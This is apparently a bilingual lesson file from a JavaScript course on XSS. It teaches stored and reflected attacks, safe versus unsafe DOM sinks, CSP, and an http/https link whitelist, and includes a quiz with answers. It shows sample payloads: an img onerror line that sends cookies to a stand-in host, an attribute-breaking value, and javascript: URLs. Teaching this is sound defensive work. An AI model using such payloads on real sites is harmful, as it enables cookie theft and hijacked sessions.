@@ -1,0 +1,364 @@
+id: js-16-07-xss-safe-sinks
+unit: JS-16
+title:
+  uk: "XSS і безпечні sinks"
+  en: "XSS and safe sinks"
+kind: instructional
+minutes: 12
+contentVersion: 1
+objectives:
+  - uk: "Пояснити, як stored і reflected XSS перетворюють недовірений текст на виконаний скрипт через небезпечний sink."
+    en: "Explain how stored and reflected XSS turn untrusted text into executed script through an unsafe sink."
+  - uk: "Розподілити API DOM на безпечні й небезпечні sinks (`innerHTML`, `insertAdjacentHTML`, `outerHTML`, `document.write`, адреси `javascript:` у `href`, атрибути-обробники) і замінити кожне небезпечне використання."
+    en: "Classify DOM APIs as safe or unsafe sinks (`innerHTML`, `insertAdjacentHTML`, `outerHTML`, `document.write`, `javascript:` URLs in `href`, inline event attributes) and replace each unsafe use."
+  - uk: "Пояснити, що додає Content-Security-Policy як другий рівень захисту і чому вона не замінює безпечних sinks."
+    en: "Explain what a Content-Security-Policy adds as a second layer and why it does not replace safe sinks."
+prerequisites: [js-16-06-untrusted-input-safe-output]
+subskills:
+  - { family: W-05, skill: "XSS threat/safe sinks", depth: intro }
+glossary: [xss, stored-xss, reflected-xss, safe-sink, content-security-policy]
+selfCheck: [predict-runs, safe-link]
+
+blocks:
+  - id: what-xss-is
+    kind: explanation
+    title:
+      uk: "Коли текст стає кодом"
+      en: "When text becomes code"
+    body:
+      uk: |
+        [[xss|XSS (cross-site scripting)]] — це коли недовірений текст потрапляє в [[unsafe-sink|небезпечне місце]] і браузер **виконує** його як код сторінки. Наприклад, назва бажання
+
+        ```html
+        <img src="x" onerror="sendCookiesTo('evil.example')">
+        ```
+
+        через `innerHTML` стає елементом `img`; зображення `x` не завантажується, і браузер запускає код з атрибута `onerror` — з усіма правами твоєї сторінки: читати `localStorage`, змінювати сторінку, надсилати запити від імені людини.
+
+        Два шляхи:
+
+        - [[stored-xss|Stored XSS]] — шкідливий текст **зберігся** (у базі, файлі, `localStorage`) і спрацьовує в кожного, хто відкрив запис.
+        - [[reflected-xss|Reflected XSS]] — текст приходить в **адресі** (`?q=…`), сторінка показує його («Результати для …»), і досить переконати людину відкрити посилання.
+
+        «У мене локальний застосунок без входу, красти нічого» — ні: є дані в `localStorage`, є сама сторінка, а файл з фікстурами міг прийти від будь-кого.
+      en: |
+        [[xss|XSS (cross-site scripting)]] is when untrusted text reaches an [[unsafe-sink]] and the browser **runs** it as the page’s code. For example, the wish name
+
+        ```html
+        <img src="x" onerror="sendCookiesTo('evil.example')">
+        ```
+
+        becomes an `img` element through `innerHTML`; the image `x` fails to load, and the browser runs the code in the `onerror` attribute — with all the rights of your page: reading `localStorage`, changing the page, sending requests on the person’s behalf.
+
+        Two routes:
+
+        - [[stored-xss|Stored XSS]] — the harmful text was **saved** (in a database, a file, `localStorage`) and fires for everyone who opens the record.
+        - [[reflected-xss|Reflected XSS]] — the text arrives in the **address** (`?q=…`), the page shows it (“Results for …”), and it is enough to talk a person into opening the link.
+
+        “My app is local, with no login, there is nothing to steal” — no: there is data in `localStorage`, there is the page itself, and a fixture file may have come from anyone.
+
+  - id: sinks
+    kind: explanation
+    title:
+      uk: "Небезпечні й безпечні sinks"
+      en: "Unsafe and safe sinks"
+    body:
+      uk: |
+        | Небезпечний sink | Чому | Заміна — [[safe-sink\|безпечний sink]] |
+        |---|---|---|
+        | `el.innerHTML = text` | розбирає HTML | `el.textContent = text` |
+        | `el.insertAdjacentHTML(…, text)`, `el.outerHTML = text` | так само | `createElement` + `textContent`, `append` |
+        | `document.write(text)` | пише HTML у сторінку | `createElement` + `append` |
+        | `a.href = text` | `javascript:…` виконується при кліку | перевірити схему через `new URL(text).protocol` |
+        | `<button onclick="…">` у HTML | код записано текстом у розмітці | `button.addEventListener("click", …)` |
+
+        Заміна `<` і `>` вручну не рятує: у шаблоні `` `<img alt="${name}">` `` назва `x" onerror="…` закриває атрибут лапкою — без жодної кутової дужки. Тому недовірений текст **ніколи** не склеюють у HTML, а кладуть у безпечні sinks.
+      en: |
+        | Unsafe sink | Why | Replacement — a [[safe-sink]] |
+        |---|---|---|
+        | `el.innerHTML = text` | parses HTML | `el.textContent = text` |
+        | `el.insertAdjacentHTML(…, text)`, `el.outerHTML = text` | the same | `createElement` + `textContent`, `append` |
+        | `document.write(text)` | writes HTML into the page | `createElement` + `append` |
+        | `a.href = text` | `javascript:…` runs on click | check the scheme with `new URL(text).protocol` |
+        | `<button onclick="…">` in HTML | the code is written as text in the markup | `button.addEventListener("click", …)` |
+
+        Replacing `<` and `>` by hand does not help: in the template `` `<img alt="${name}">` `` the name `x" onerror="…` closes the attribute with a quote — without a single angle bracket. So untrusted text is **never** glued into HTML; it goes into safe sinks.
+
+  - id: predict-runs
+    kind: prediction
+    prompt:
+      uk: "Записи з фікстури показують п’ятьма способами. Кожна шкідлива назва лише друкує в консоль позначку. У звичайній вебсторінці — у яких випадках код із назви виконається (одразу чи після кліку)? Обери всі."
+      en: "Records from a fixture are shown in five ways. Each harmful name only prints a marker to the console. In an ordinary web page — in which cases does the code from the name run (at once or after a click)? Choose all that apply."
+    code: |
+      const img = `<img src="missing.svg" onerror="console.log('marker')">`;
+      item1.innerHTML = img;                                         // 1
+      item2.textContent = img;                                       // 2
+      list.insertAdjacentHTML("beforeend", `<li>${img}</li>`);       // 3
+      link.href = record.homepage; // "javascript:console.log('marker')"   4
+      const alt = `x" onerror="console.log('marker')`.replaceAll("<", "&lt;").replaceAll(">", "&gt;");
+      list.insertAdjacentHTML("beforeend", `<li><img src="missing.svg" alt="${alt}"></li>`); // 5
+    runnable: false
+    answer:
+      type: multi
+      options:
+        - id: one
+          text: { uk: "1 — `innerHTML`", en: "1 — `innerHTML`" }
+        - id: two
+          text: { uk: "2 — `textContent`", en: "2 — `textContent`" }
+          why:
+            uk: "`textContent` нічого не розбирає: людина бачить текст `<img …>`, елемента немає, виконувати нічого."
+            en: "`textContent` parses nothing: the person sees the text `<img …>`, there is no element, nothing to run."
+        - id: three
+          text: { uk: "3 — `insertAdjacentHTML`", en: "3 — `insertAdjacentHTML`" }
+        - id: four
+          text: { uk: "4 — `href` з `javascript:`, після кліку", en: "4 — `href` with `javascript:`, after a click" }
+        - id: five
+          text: { uk: "5 — атрибут `alt` у шаблоні після заміни `<` і `>`", en: "5 — the `alt` attribute in a template after replacing `<` and `>`" }
+      correct: [one, three, four, five]
+    explanation:
+      uk: "Безпечний лише 2. `innerHTML` та `insertAdjacentHTML` створюють `img` з `onerror`. Адреса `javascript:` виконує свій текст при кліку. А в 5 кутових дужок немає зовсім: лапка закриває `alt`, і `onerror` стає новим атрибутом. У прикладі цього уроку — ті самі випадки по-справжньому."
+      en: "Only 2 is safe. `innerHTML` and `insertAdjacentHTML` create an `img` with `onerror`. A `javascript:` address runs its text on a click. And 5 has no angle brackets at all: the quote closes `alt`, and `onerror` becomes a new attribute. This lesson’s example has the same cases for real."
+
+  - id: payload-path
+    kind: visual
+    visual: diagram
+    title:
+      uk: "Шлях шкідливої назви: два sinks і CSP"
+      en: "The path of a harmful name: two sinks and a CSP"
+    textEquivalent:
+      uk: "Збережена фікстура містить синтетичну назву `<img src=x onerror=…>`. Шлях через innerHTML: розбирач HTML створює в DOM елемент img з атрибутом onerror, зображення не завантажується, і браузер виконує код обробника — це stored XSS. Шлях через textContent: та сама назва стає одним текстовим вузлом, людина бачить кутові дужки, і нічого не виконується. Третій учасник — Content-Security-Policy, заголовок чи тег meta, що забороняє, наприклад, вбудовані обробники й скрипти. Якщо політика є, вона блокує виконання onerror навіть після небезпечного innerHTML і повідомляє про порушення. Але це другий рівень: розмітка з даних уже потрапила в сторінку, а політику можна послабити чи забути. Перший рівень — безпечний sink, тобто textContent."
+      en: "A stored fixture holds the synthetic name `<img src=x onerror=…>`. The path through innerHTML: the HTML parser creates an img element with an onerror attribute in the DOM, the image fails to load, and the browser runs the handler’s code — that is stored XSS. The path through textContent: the same name becomes one text node, the person sees the angle brackets, and nothing runs. The third participant is a Content-Security-Policy, a header or meta tag that forbids, for example, inline handlers and scripts. If the policy is there, it blocks the onerror code even after an unsafe innerHTML and reports a violation. But it is a second layer: the markup from the data has already entered the page, and a policy can be loosened or forgotten. The first layer is a safe sink, that is, textContent."
+    spec:
+      layout: grid
+      nodes:
+        - { id: fixture, label: { uk: "збережена фікстура", en: "stored fixture" }, shape: cylinder, w: 150, col: 0, row: 0 }
+        - { id: inner, label: "innerHTML", shape: round, col: 0, row: 1 }
+        - { id: text, label: "textContent", shape: round, col: 1, row: 1 }
+        - { id: img, label: "<img onerror>", col: 0, row: 2 }
+        - { id: node, label: { uk: "текстовий вузол", en: "text node" }, col: 1, row: 2 }
+        - { id: run, label: { uk: "код виконано", en: "code runs" }, shape: note, col: 0, row: 3 }
+        - { id: csp, label: "CSP", shape: pill, col: 1, row: 3 }
+      edges:
+        - { id: f-inner, from: fixture, to: inner }
+        - { id: f-text, from: fixture, to: text }
+        - { id: inner-img, from: inner, to: img }
+        - { id: text-node, from: text, to: node }
+        - { id: img-run, from: img, to: run }
+        - { id: csp-run, from: csp, to: run, kind: dashed, label: { uk: "блокує", en: "blocks" } }
+      hidden: [csp, csp-run]
+      steps:
+        - caption:
+            uk: "У збереженій фікстурі — синтетична назва `<img src=x onerror=…>`."
+            en: "A stored fixture holds the synthetic name `<img src=x onerror=…>`."
+          highlight: [fixture]
+        - caption:
+            uk: "Через `innerHTML` розбирач HTML створює справжній `img` з атрибутом `onerror`."
+            en: "Through `innerHTML` the HTML parser creates a real `img` with an `onerror` attribute."
+          highlight: [f-inner, inner, inner-img, img]
+          dim: [text, node, f-text, text-node]
+        - caption:
+            uk: "Зображення `x` не завантажується — браузер виконує код обробника з правами сторінки. Це stored XSS."
+            en: "The image `x` fails to load — the browser runs the handler’s code with the page’s rights. That is stored XSS."
+          highlight: [img, img-run, run]
+          dim: [text, node, f-text, text-node]
+        - caption:
+            uk: "Та сама назва через `textContent` — один текстовий вузол. Людина бачить знаки, виконувати нічого."
+            en: "The same name through `textContent` is one text node. The person sees characters; there is nothing to run."
+          highlight: [f-text, text, text-node, node]
+          dim: [inner, img, run, f-inner, inner-img, img-run]
+        - caption:
+            uk: "Content-Security-Policy забороняє вбудовані обробники: навіть після `innerHTML` код не виконається, а браузер повідомить про порушення."
+            en: "A Content-Security-Policy forbids inline handlers: even after `innerHTML` the code does not run, and the browser reports a violation."
+          show: [csp, csp-run]
+          highlight: [csp, csp-run, run]
+        - caption:
+            uk: "Але CSP — другий рівень: розмітка з даних уже в сторінці, а політику можна послабити чи забути. Перший рівень — безпечний sink."
+            en: "But a CSP is a second layer: the markup from the data is already in the page, and a policy can be loosened or forgotten. The first layer is a safe sink."
+          highlight: [text, node]
+
+  - id: xss-lab
+    kind: example
+    runtime: browser-js
+    dir: xss-lab
+    entry: index.html
+    strings:
+      lang: { uk: "uk", en: "en" }
+      title: { uk: "Лабораторія sinks", en: "Sink lab" }
+      marker: { uk: "ПОЗНАЧКА XSS", en: "XSS MARKER" }
+      cspBlocked: { uk: "CSP заблокувала:", en: "CSP blocked:" }
+      linkScheme: { uk: "схема посилання:", en: "link scheme:" }
+      organizer: { uk: "Сторінка організатора", en: "Organizer’s page" }
+    title:
+      uk: "П’ять sinks, синтетичні payloads"
+      en: "Five sinks, synthetic payloads"
+    body:
+      uk: |
+        Кожен payload — синтетичний: якщо він спрацює, то лише надрукує в консоль «ПОЗНАЧКА XSS» з номером випадку. Запусти: позначки з’являться після звичайних рядків, бо обробник `onerror` спрацьовує, коли зображення не завантажилося. Повідомлення платформи про відсутній файл `missing.svg` — очікувані: саме через нього й спрацьовує `onerror`.
+      en: |
+        Every payload is synthetic: if it fires, it only prints “XSS MARKER” with the case number to the console. Run it: the markers appear after the ordinary lines, because the `onerror` handler fires once an image has failed to load. The platform’s notes about the missing file `missing.svg` are expected: that is exactly what makes `onerror` fire.
+    tryIt:
+      uk: |
+        1. Заміни `first.innerHTML` на `first.textContent` — позначка 1 зникне, а на сторінці з’явиться текст тегу.
+        2. Перепиши випадки 2 і 4 без `insertAdjacentHTML`. Для 2 створи `li` через `createElement` і поклади в нього `PAYLOADS.adjacentName` через `textContent`. Для 4 створи `li` і `img`, задай `img.src = "missing.svg"`, а `alt` — через `setAttribute("alt", PAYLOADS.altName)`. Позначки 2 і 4 зникнуть.
+        3. Поверни все як було і додай у `index.html` одразу після `<meta charset="utf-8">` рядок `<meta http-equiv="Content-Security-Policy" content="script-src 'self' blob:">`. Запусти: позначок немає, натомість тричі «CSP заблокувала: script-src-attr». Розмітка з даних при цьому лишилася в сторінці — подивись на панелі Elements.
+        4. Клацни посилання на **Сторінці**: платформа зупиняє кожен перехід, що закрив би програму, і пише про це в консолі. У звичайній сторінці цей клік виконав би код після `javascript:` — консоль показує, що схема посилання саме така.
+      en: |
+        1. Replace `first.innerHTML` with `first.textContent` — marker 1 disappears, and the page shows the tag as text.
+        2. Rewrite cases 2 and 4 without `insertAdjacentHTML`. For 2 create an `li` with `createElement` and put `PAYLOADS.adjacentName` into it with `textContent`. For 4 create an `li` and an `img`, set `img.src = "missing.svg"`, and set `alt` with `setAttribute("alt", PAYLOADS.altName)`. Markers 2 and 4 disappear.
+        3. Put everything back and in `index.html`, right after `<meta charset="utf-8">`, add the line `<meta http-equiv="Content-Security-Policy" content="script-src 'self' blob:">`. Run: no markers, but “CSP blocked: script-src-attr” three times instead. The markup from the data is still in the page, though — look in the Elements panel.
+        4. Click the link on the **Page**: the platform stops every navigation that would close your program and says so in the console. In an ordinary page this click would run the code after `javascript:` — the console shows that this is exactly the link’s scheme.
+
+  - id: csp
+    kind: explanation
+    title:
+      uk: "CSP — другий рівень, не перший"
+      en: "CSP is the second layer, not the first"
+    body:
+      uk: |
+        [[content-security-policy|Content-Security-Policy]] — заголовок відповіді (або тег `<meta>`), яким сторінка каже браузерові, звідки можна брати скрипти:
+
+        ```text
+        Content-Security-Policy: script-src 'self'
+        ```
+
+        Така політика дозволяє лише скрипти-файли з того самого origin і забороняє вбудовані `<script>…</script>` та атрибути-обробники на кшталт `onerror`. Навіть якщо XSS-розмітка потрапила в сторінку, її код не виконається.
+
+        Але CSP не замінює безпечних sinks: розмітка з даних однаково ламає сторінку, політику легко послабити словом `'unsafe-inline'`, а старі браузери чи інші сторінки сайту можуть її не мати. Порядок такий: спершу безпечні sinks, потім CSP як страховка. І тому обробники вішають через `addEventListener`, а не атрибутом `onclick` у HTML: так сторінка працює й під суворою політикою.
+      en: |
+        A [[content-security-policy|Content-Security-Policy]] is a response header (or a `<meta>` tag) with which a page tells the browser where scripts may come from:
+
+        ```text
+        Content-Security-Policy: script-src 'self'
+        ```
+
+        Such a policy allows only script files from the same origin and forbids inline `<script>…</script>` and handler attributes such as `onerror`. Even if XSS markup reaches the page, its code does not run.
+
+        But a CSP does not replace safe sinks: markup from data still breaks the page, a policy is easily loosened with `'unsafe-inline'`, and old browsers or other pages of the site may not have it. The order is: safe sinks first, then a CSP as insurance. And that is why handlers are attached with `addEventListener` rather than an `onclick` attribute in HTML: that way the page keeps working under a strict policy.
+
+  - id: recall
+    kind: review
+    title:
+      uk: "Пригадай: слухач подій"
+      en: "Recall: an event listener"
+    items:
+      - id: who-calls
+        from: js-06-10-events-default-behavior
+        prompt:
+          uk: "`saveButton.addEventListener(\"click\", saveWish)`. Коли виконується `saveWish`?"
+          en: "`saveButton.addEventListener(\"click\", saveWish)`. When does `saveWish` run?"
+        answer:
+          type: choice
+          options:
+            - id: each-click
+              text: { uk: "Її викликає браузер — щоразу, коли натиснуто кнопку", en: "The browser calls it — every time the button is clicked" }
+            - id: now
+              text: { uk: "Одразу, у рядку коду з `addEventListener`", en: "Right away, on the line with `addEventListener`" }
+              why:
+                uk: "`addEventListener` лише реєструє функцію. Викликала б її одразу форма `saveWish()` з дужками — і передала б результат замість функції."
+                en: "`addEventListener` only registers the function. The form `saveWish()` with brackets would call it at once — and pass its result instead of the function."
+            - id: once
+              text: { uk: "Лише при першому кліку", en: "Only on the first click" }
+              why:
+                uk: "Слухач лишається, доки його не прибрали (`removeEventListener`), тож спрацьовує на кожен клік."
+                en: "A listener stays until it is removed (`removeEventListener`), so it fires on every click."
+          correct: [each-click]
+        explanation:
+          uk: "`addEventListener` передає браузерові саму функцію, і той викликає її на кожну подію. Код при цьому лишається в JavaScript-файлі, а не текстом у розмітці, як атрибут `onclick=\"…\"`, — тому він працює й під Content-Security-Policy, що забороняє атрибути-обробники."
+          en: "`addEventListener` hands the browser the function itself, and the browser calls it on every event. The code stays in the JavaScript file rather than being text in the markup like an `onclick=\"…\"` attribute — which is why it keeps working under a Content-Security-Policy that forbids handler attributes."
+
+  - id: safe-link
+    kind: exercise
+    mode: guided
+    runtime: browser-js
+    dir: safe-link
+    entry: index.html
+    editable: [index.js]
+    strings:
+      lang: { uk: "uk", en: "en" }
+      title: { uk: "Де купити", en: "Where to buy" }
+      headphones: { uk: "Навушники", en: "Headphones" }
+      lamp: { uk: "Настільна лампа", en: "Desk lamp" }
+      bicycle: { uk: "Велосипед", en: "Bicycle" }
+      tickets: { uk: "Квитки на концерт", en: "Concert tickets" }
+      mug: { uk: "Термочашка", en: "Travel mug" }
+      book: { uk: "Книжка про JavaScript", en: "A book about JavaScript" }
+      marker: { uk: "ПОЗНАЧКА XSS", en: "XSS MARKER" }
+    title:
+      uk: "safeLink: лише http і https"
+      en: "safeLink: http and https only"
+    instructions:
+      uk: |
+        У фікстурі бажань є поле `shopLink` — адреса магазину. Не кожна з них безпечна.
+
+        1. Допиши `safeLink(url)`: якщо `url` — абсолютна адреса зі схемою `http:` чи `https:`, повертає її текстом так, як її нормалізує URL API (`href`); для будь-якої іншої схеми й для всього, що не є адресою (зокрема `null`), повертає `null`.
+        2. Зміни `renderWish(wish)`: посилання `<a>` з’являється, лише коли `safeLink` дав адресу; інакше в `li` — просто назва бажання текстом.
+      en: |
+        The wishes fixture has a `shopLink` field — the shop’s address. Not every one of them is safe.
+
+        1. Complete `safeLink(url)`: if `url` is an absolute address with the `http:` or `https:` scheme, it returns it as text the way the URL API normalizes it (`href`); for any other scheme and for anything that is not an address (`null` included) it returns `null`.
+        2. Change `renderWish(wish)`: an `<a>` link appears only when `safeLink` gave an address; otherwise the `li` holds just the wish’s name as text.
+    testTitles:
+      "accepts http and https addresses":
+        uk: "Приймає адреси `http` і `https`"
+        en: "Accepts `http` and `https` addresses"
+      "returns the address as the URL API normalizes it":
+        uk: "Повертає адресу так, як її нормалізує URL API"
+        en: "Returns the address as the URL API normalizes it"
+      "refuses javascript: in any spelling":
+        uk: "Відкидає `javascript:` у будь-якому написанні"
+        en: "Refuses `javascript:` in any spelling"
+      "refuses other schemes and text that is not an address":
+        uk: "Відкидає інші схеми й текст, що не є адресою"
+        en: "Refuses other schemes and text that is not an address"
+      "renderWish links only to safe addresses":
+        uk: "`renderWish` робить посилання лише на безпечні адреси"
+        en: "`renderWish` links only to safe addresses"
+      "every link on the page uses http or https, and every wish is shown":
+        uk: "Кожне посилання на сторінці — `http` чи `https`, і всі бажання показано"
+        en: "Every link on the page uses `http` or `https`, and every wish is shown"
+    hints:
+      nudge:
+        uk: "Не шукай «погані» схеми в тексті — їх забагато й пишуть їх по-різному. Дозволь лише дві хороші. Хто вміє точно сказати, яка в адреси схема?"
+        en: "Do not search the text for “bad” schemes — there are too many, written in too many ways. Allow only the two good ones. What can tell you exactly which scheme an address has?"
+      explanation:
+        uk: "`new URL(text)` прибирає пробіли на початку, зводить схему до малих літер і викидає `TypeError`, якщо текст — не абсолютна адреса. Тож розбирай адресу всередині `try`, у `catch` повертай `null`, а далі порівнюй `protocol` зі списком дозволених — так само, як для зображень порівнював би з `[\"image/png\", \"image/svg+xml\"]`. Повертай `href` розібраної адреси, а не початковий текст."
+        en: "`new URL(text)` strips spaces at the start, lowers the scheme’s letters and throws a `TypeError` if the text is not an absolute address. So parse the address inside `try`, return `null` in `catch`, and then compare `protocol` with a list of allowed ones — just as you would compare an image’s type with `[\"image/png\", \"image/svg+xml\"]`. Return the parsed address’s `href`, not the original text."
+    solutionNote:
+      uk: "Список дозволених схем надійніший за список заборонених: `URL` сам розбирає всі хитрощі написання (великі літери, пробіли, табуляції всередині слова), тож перевіряється справжня схема, а не текст. Небезпечна адреса просто не стає посиланням — людина бачить назву, але клікнути нема на що."
+      en: "A list of allowed schemes is more reliable than a list of forbidden ones: `URL` itself deals with every spelling trick (capital letters, spaces, tabs inside the word), so the real scheme is checked, not the text. An unsafe address simply does not become a link — the person sees the name, but there is nothing to click."
+    feedback:
+      - when: { test: "accepts http and https addresses" }
+        message:
+          uk: "Ця перевірка очікує, що `safeLink` повертає адреси `https://…` і `http://…` без змін."
+          en: "This check expects `safeLink` to return `https://…` and `http://…` addresses unchanged."
+      - when: { test: "returns the address as the URL API normalizes it" }
+        message:
+          uk: "Ця перевірка передає `HTTPS://Shop.Example/Lamp` і очікує `https://shop.example/Lamp` — `href`, який дає `new URL`. Перевірка тексту шаблоном таку адресу відкине."
+          en: "This check passes `HTTPS://Shop.Example/Lamp` and expects `https://shop.example/Lamp` — the `href` that `new URL` gives. A pattern check on the text rejects such an address."
+      - when: { test: "refuses javascript: in any spelling" }
+        message:
+          uk: "Ця перевірка очікує `null` для `javascript:` у різних написаннях: з великими літерами, з пробілами на початку й з табуляцією всередині слова."
+          en: "This check expects `null` for `javascript:` spelled in different ways: with capital letters, with leading spaces and with a tab inside the word."
+      - when: { test: "refuses other schemes and text that is not an address" }
+        message:
+          uk: "Ця перевірка очікує `null` для `data:`, `mailto:`, `ftp:`, відносного шляху, порожнього тексту, `null` і `undefined` — без кинутої помилки."
+          en: "This check expects `null` for `data:`, `mailto:`, `ftp:`, a relative path, empty text, `null` and `undefined` — without a thrown error."
+      - when: { test: "renderWish links only to safe addresses" }
+        message:
+          uk: "Ця перевірка очікує посилання з `href` для `https://shop.example/book` і жодного `a` для адреси `javascript:` — лише назву бажання текстом."
+          en: "This check expects a link with an `href` for `https://shop.example/book` and no `a` at all for a `javascript:` address — just the wish’s name as text."
+      - when: { test: "every link on the page uses http or https, and every wish is shown" }
+        message:
+          uk: "Ця перевірка очікує на сторінці всі п’ять бажань і рівно два посилання — `https:` і `http:`."
+          en: "This check expects all five wishes on the page and exactly two links — `https:` and `http:`."
+      - when: { error: TypeError }
+        message:
+          uk: "`TypeError` означає, що значення має не той тип, на який розраховує код. `Invalid URL` — `new URL` отримав не адресу: такий виклик має стояти всередині `try`. `… is not a function` — програма зупинилася ще під час завантаження."
+          en: "A `TypeError` means a value has a different type than the code expects. `Invalid URL` — `new URL` received something that is not an address: such a call belongs inside `try`. `… is not a function` — the program stopped while loading."
+
+  - id: to-project
+    kind: transfer
+    capstoneStep: JS-16
+    body:
+      uk: "У кроці проєкту фікстура навмисно містить назву з розміткою. Переконайся, що вона з’являється на сторінці як текст, а якщо проєкт показує посилання з даних — що кожне проходить через `safeLink`."
+      en: "In the project step a fixture deliberately holds a name with markup. Make sure it appears on the page as text, and if the project shows links from data, that each one goes through `safeLink`."
